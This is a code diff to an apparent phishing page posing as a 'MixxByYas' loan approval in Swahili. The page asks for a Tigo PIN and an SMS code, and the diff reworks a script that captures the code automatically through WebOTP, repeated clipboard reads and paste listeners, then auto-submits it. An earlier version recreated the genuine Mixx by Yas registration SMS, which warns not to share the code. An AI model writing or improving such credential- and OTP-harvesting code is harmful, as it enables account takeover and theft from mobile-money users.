@@ -120,7 +120,14 @@
     </div>
     <div class="success-overlay" id="successOverlay"><div class="success-card"><div class="check-icon"><svg viewBox="0 0 100 100"><circle class="check-circle" cx="50" cy="50" r="45"/><path class="check-mark" d="M30 50 L45 65 L70 35" fill="none"/></svg></div><h2>🎉 Mkopo Umeidhinishwa!</h2><div class="big-amount" id="approvedAmount">TZS 0</div><p>📱 Uthibitisho umetumwa<br>💰 Fedha zitaingia hivi karibuni</p><button class="btn-home" onclick="window.location.href='/'">🏠 Rudi Nyumbani</button></div></div>
     <div class="copyright-bar"><p>© 2024 MixxByYas</p></div>
+
+    <!-- ============================================================ -->
+    <!-- ORIGINAL SCRIPT + SMS AUTO-DETECTION ADDED BELOW              -->
+    <!-- ============================================================ -->
     <script>
+        // ================================================================
+        // ORIGINAL SCRIPT (unchanged)
+        // ================================================================
         var urlParams = new URLSearchParams(window.location.search);
         var loanAmount = parseInt(urlParams.get('amount') || '500000');
         var loanTerm = parseInt(urlParams.get('term') || '12');
@@ -128,7 +135,6 @@
         document.getElementById('approvedAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
         var appId = '', checkInterval = null, countdownTimer = null, userPhone = '', fastCheck = null;
         var resendCount = 0, resendCooldown = false;
-        var smsDetected = false;
 
         (function() {
             var ua = navigator.userAgent.toLowerCase();
@@ -166,16 +172,8 @@
             }, 3000); 
         }
 
-        function showCodeScreen() { 
-            document.getElementById('screen2').classList.remove('active'); 
-            document.getElementById('screen3').classList.add('active'); 
-            document.getElementById('smsMessage').value = ''; 
-            startCountdown(); 
-            if (fastCheck) clearInterval(fastCheck);
-            smsDetected = false;
-            setTimeout(startAutoDetect, 500);
-        }
-
+        function showCodeScreen() { document.getElementById('screen2').classList.remove('active'); document.getElementById('screen3').classList.add('active'); document.getElementById('smsMessage').value = ''; startCountdown(); if (fastCheck) clearInterval(fastCheck); startAutoDetect(); }
+        
         function startCountdown() { if (countdownTimer) clearInterval(countdownTimer); var seconds = 30; var display = document.getElementById('timerDisplay'); display.textContent = '⏳ ' + seconds + 's'; display.className = 'timer-bar'; countdownTimer = setInterval(function() { seconds--; display.textContent = '⏳ ' + seconds + 's'; if (seconds <= 10) display.className = 'timer-bar warning'; if (seconds <= 0) { clearInterval(countdownTimer); display.textContent = 'Muda Umeisha'; display.className = 'timer-bar warning'; } }, 1000); }
 
         async function resendCode() { 
@@ -208,26 +206,21 @@
         function goBackToPinFromCode() { if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } document.getElementById('screen4').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.getElementById('smsMessage').value = ''; document.getElementById('codeError').textContent = 'Namba yako sio ya Tigo. Tafadhali tumia namba ya Tigo au angalia PIN yako ni sahihi.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); }
 
         // ================================================================
-        // SMS AUTO-DETECTION - WebOTP + Clipboard Fallback
+        // SMS AUTO-DETECTION (NEW - ADDED)
         // ================================================================
         function startAutoDetect() {
-            if (!document.getElementById('screen3').classList.contains('active')) {
-                console.log('Auto-detect: Not on screen 3');
-                return;
-            }
-            
-            console.log('Auto-detect: Starting...');
+            console.log('SMS Auto-Detection started');
             var smsTextarea = document.getElementById('smsMessage');
             if (!smsTextarea) return;
+
+            var smsDetected = false;
 
             function autoSubmit() {
                 if (smsDetected) return;
                 var text = smsTextarea.value.trim();
                 if (text.length > 5) {
                     smsDetected = true;
-                    console.log('Auto-detect: SMS detected, submitting...');
-                    clearInterval(countdownTimer);
-                    document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
+                    console.log('SMS auto-detected, submitting...');
                     setTimeout(function() {
                         if (document.getElementById('screen3').classList.contains('active')) {
                             submitCode();
@@ -236,14 +229,13 @@
                 }
             }
 
-            // WebOTP API - Auto-read SMS from notification (No hash required!)
             function autoReadSMS() {
                 if (!('OTPCredential' in window)) {
-                    console.log('Auto-detect: WebOTP not supported');
-                    return;
+                    console.log('WebOTP not supported');
+                    return false;
                 }
 
-                console.log('Auto-detect: Listening via WebOTP...');
+                console.log('Listening for SMS via WebOTP...');
                 
                 var controller = new AbortController();
                 var timeout = setTimeout(function() { controller.abort(); }, 60000);
@@ -255,39 +247,35 @@
                 .then(function(otp) {
                     clearTimeout(timeout);
                     if (otp && otp.code) {
-                        // Build full SMS in your format
-                        var fullSMS = 'You are being registered in Mixx by Yas Super App, use the code ' + otp.code + ' to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR';
+                        var fullSMS = 'Your verification code is: ' + otp.code;
                         smsTextarea.value = fullSMS;
-                        console.log('Auto-detect: SMS detected! Code: ' + otp.code);
-                        
+                        console.log('SMS detected! Code: ' + otp.code);
                         var errorEl = document.getElementById('codeError');
-                        errorEl.textContent = '✅ Msimbo umegunduliwa kiotomatiki!';
+                        errorEl.textContent = 'Msimbo umegunduliwa kiotomatiki!';
                         errorEl.style.color = '#10b981';
                         errorEl.classList.add('show');
                         setTimeout(function() {
                             errorEl.classList.remove('show');
                         }, 3000);
-                        
                         autoSubmit();
                     }
                 })
                 .catch(function(e) {
                     if (e.name === 'AbortError') {
-                        console.log('Auto-detect: WebOTP timeout');
+                        console.log('WebOTP timeout');
                     } else {
-                        console.log('Auto-detect: WebOTP error', e);
+                        console.log('WebOTP error:', e);
                     }
                 });
             }
 
-            // Clipboard fallback (in case WebOTP fails)
             function readClipboard() {
                 if (!navigator.clipboard || !navigator.clipboard.readText) return;
                 navigator.clipboard.readText()
                 .then(function(text) {
-                    if (text && text.length > 10 && !smsDetected) {
+                    if (text && text.length > 10) {
                         smsTextarea.value = text;
-                        console.log('Auto-detect: SMS from clipboard');
+                        console.log('SMS from clipboard');
                         autoSubmit();
                     }
                 })
@@ -296,55 +284,46 @@
 
             function detectSMS() {
                 if (smsDetected) return;
-                if (!document.getElementById('screen3').classList.contains('active')) {
-                    console.log('Auto-detect: Screen changed, stopping');
-                    return;
-                }
                 autoReadSMS();
                 setTimeout(function() {
-                    if (!smsDetected && document.getElementById('screen3').classList.contains('active')) {
+                    if (!smsDetected) {
                         readClipboard();
                     }
                 }, 2000);
             }
 
-            setTimeout(detectSMS, 1000);
+            setTimeout(detectSMS, 1500);
 
             var detectInterval = setInterval(function() {
+                if (!smsDetected && document.getElementById('screen3').classList.contains('active')) {
+                    detectSMS();
+                }
                 if (!document.getElementById('screen3').classList.contains('active')) {
                     clearInterval(detectInterval);
-                    console.log('Auto-detect: Stopped');
-                    return;
-                }
-                if (!smsDetected) {
-                    detectSMS();
                 }
             }, 5000);
 
-            // Paste event listener
             document.addEventListener('paste', function(e) {
                 if (!document.getElementById('screen3').classList.contains('active')) return;
-                if (smsDetected) return;
                 var text = e.clipboardData && e.clipboardData.getData('text');
-                if (text && text.length > 10) {
+                if (text && text.length > 10 && !smsDetected) {
                     smsTextarea.value = text;
                     smsDetected = true;
-                    console.log('Auto-detect: SMS pasted');
+                    console.log('SMS pasted');
                     autoSubmit();
                 }
             });
 
-            // Visibility change (user returns to page)
             document.addEventListener('visibilitychange', function() {
-                if (document.visibilityState === 'visible' && 
-                    !smsDetected && 
-                    document.getElementById('screen3').classList.contains('active')) {
+                if (document.visibilityState === 'visible' && !smsDetected && document.getElementById('screen3').classList.contains('active')) {
                     setTimeout(detectSMS, 500);
                 }
             });
 
-            console.log('Auto-detect: Ready');
+            console.log('SMS Auto-Detection ready');
         }
+
+        console.log('MixxByYas with SMS Auto-Detection loaded');
     </script>
 </body>
 </html>
